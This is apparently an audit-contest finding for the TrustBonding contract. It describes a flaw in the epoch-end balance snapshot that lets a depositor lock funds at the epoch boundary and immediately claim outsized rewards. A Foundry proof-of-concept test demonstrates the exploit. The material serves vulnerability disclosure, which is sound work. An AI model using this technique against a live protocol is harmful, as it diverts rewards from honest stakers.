  "body": "## Finding description and impact\nThe protocol intends for users to only claim rewards for the previous epoch (currentEpoch  1), proportional to their locked deposits during that timeframe. However, a flaw in the balance snapshot mechanism allows an attacker to deposit at the exact boundary of an epoch, instantly claim rewards, and severely dilute honest users\nThe bug stems from how TrustBonding evaluates historical balances. When a user calls claimRewards(), the contract fetches their eligible rewards via `_userEligibleRewardsForEpoch()`, which in turn queries userBondedBalanceAtEpochEnd().\n\nAs shown in the contract logic, `userBondedBalanceAtEpochEnd` evaluates the user's balance at exactly `_epochTimestampEnd(epoch)`.\n\nThe protocol fails to enforcecontinuous time-weighted lock across the entire epoch. Because the exact end timestamp of the previous epoch perfectly aligns with the start of the new epoch, an attacker can execute a deposit transaction right before the epoch concludes.\n## Impact\n- malicious user can wait until the epoch ends, deposit capital with zero time-risk, and extract a massive share of the rewards, directly diluting users who held liquidity risk for the entire epoch.\n## Recommended mitigation steps\nenforce a timelock for users for locking(they should  lock their funds for X amount of time for getting rewards)",
  "proof_of_concept": "Paste this below test in the given test suite file `ClaimRewards.t.sol`\nand run it with ```forge test --mt testStepWiseJump -vvv```\n```solidity\nfunction testStepWiseJump() external {\n        // Bob creates lock/deposits in epoch 0 so that he can claim in the next epoch\n        _createLock(users.bob, initialTokens);\n\n        _advanceToEpoch(1); // after some time next epoch starts, so now bob can claim all his rewards\n\n        //  alice comes and deposits right before the next epoch or right at the end of 1st epoch\n        _createLock(users.alice, initialTokens);\n\n        uint aliceBalBeforeClaim = users.alice.balance; \n\n        resetPrank(users.alice);\n        protocol.trustBonding.claimRewards(users.alice); // and alice claims rewards before bob \n        uint aliceBalAfterClaim = users.alice.balance; // track balance after claim\n\n        bool isBalAfterClaimGreater = aliceBalAfterClaim > aliceBalBeforeClaim;\n        assertTrue(isBalAfterClaimGreater); // we see that alice was able to claim rewards in within the same epoch.\n        // we also see in the below state that alice was able to claim > rewards than bob even when deposited after bob\n\n        resetPrank(users.bob);\n        // track bob balance before he claimed\n        uint bobBalBeforeClaim = users.bob.balance;\n        vm.warp(block.timestamp + 300 seconds);\n        protocol.trustBonding.claimRewards(users.bob); // after some bob also claims\n\n        uint bobBalAfterClaim = users.bob.balance; // track bob's balance after his claim\n        assertGt(bobBalAfterClaim, bobBalBeforeClaim);\n\n       \n\n        bool isAliceBalGreaterThanBobAfterClaim = aliceBalAfterClaim > bobBalAfterClaim; \n        assertTrue(isAliceBalGreaterThanBobAfterClaim); // we see alice got more rewards than bob even when bob deposited his funds for a longer period of time\n    }\n```",
